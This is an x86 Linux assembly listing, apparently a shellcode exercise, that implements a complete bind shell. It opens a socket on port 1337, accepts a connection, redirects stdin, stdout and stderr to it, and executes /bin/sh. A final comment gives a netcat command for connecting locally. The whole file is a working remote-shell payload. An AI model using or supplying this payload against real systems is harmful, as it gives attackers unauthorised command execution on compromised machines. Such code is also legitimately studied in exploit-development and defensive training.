
section .text
global _start

_start:

	; socket(PF_NET, SOCK_STREAM, IPPROTO_IP)

	push 	byte 0x66		; socketcall()
	pop 	eax 			; eax = 0x66
	cdq 					; edx = 0x0 | saves a byte
	xor 	ebx, ebx
	inc 	ebx
	push 	edx
	push 	ebx
	push 	byte 0x2 		; PF_NET = 2
	mov 	ecx, esp 		; ecx points to args
	int 	0x80

	xchg 	esi, eax 		; sockfd is now stroed in esi

	; bind(sockfd, {sa_family=AF_NET, sin_port=htons(1337), sin_addr=inet_addr("0.0.0.0")}, 16)

	push 	edx 			; sockaddr.sin_addr.s_addr: INDDR_ANY = 0
	inc 	ebx 			; ebx = 0x2 | #define SYS_BIND 2
	push 	word 0x3905 	; sockaddr.sin_port : PORT = 1337 (big endian)
	push 	bx				; sockaddr.sin_family : AF_NET = 2
	mov 	ecx, esp 		; ecx holds pointer to struct sockaddr

	push 	byte 0x10 		; sizeof(sockaddr)
	push  	ecx 			; pinter to sockaddr
	push 	esi 			; sockfd
	mov 	ecx, esp 		; ecx points to args
	push 	byte 0x66 		; socketcall()
	pop 	eax
	int 	0x80

	; listen(socketfd, 2)

	push 	ebx 			; queueLimit = 2
	push 	esi 			; sockfd stored in esi
	mov 	ecx, esp 		; ecx points to args
	push 	byte 0x66 		; socketcall()
	pop 	eax
	inc 	ebx 			
	inc 	ebx 			; #define SYS_LISTEN 4
	int 0x80

	; accept(int sockfd, NULL, NULL)

	push 	edx 			; push NULL
	push 	edx
	push 	esi 			; push sockfd
	mov 	ecx, esp 		; ecx points to args
	inc 	ebx 			; #define SYS_ACCEPT 5
	mov 	al, 0x66 		; socketcall()
	int 	0x80

	; dup2(ebx, {0,1,2}) | STDIN, STDOUT, STDERR

	xchg 	ebx, eax 		; eax = 0x5, ebx = new_sockfd
	xor 	ecx, ecx 		; ecx = 0
lbl:
	mov 	al, 0x3f 		; dup2()
	int 	0x80
	inc 	ecx 			; iterate over {0,1,2}
	cmp 	cl, 0x4 		; are we done?
	jne 	lbl 			; nope

	; execve("/bin//sh", NULL, NULL)

	push 	edx 			; null terminator
	push 	0x68732f2f 		; "hs//"
	push 	0x6e69622f 		; "nib/"

	mov 	ebx, esp 		; ebx points to "/bin//sh"
	mov 	ecx, edx 		; ecx = NULL

	mov 	al, 0xb 		; execve()
	int 	0x80

	; execute file and run "nc -nv 127.0.0.1 1337" in another terminal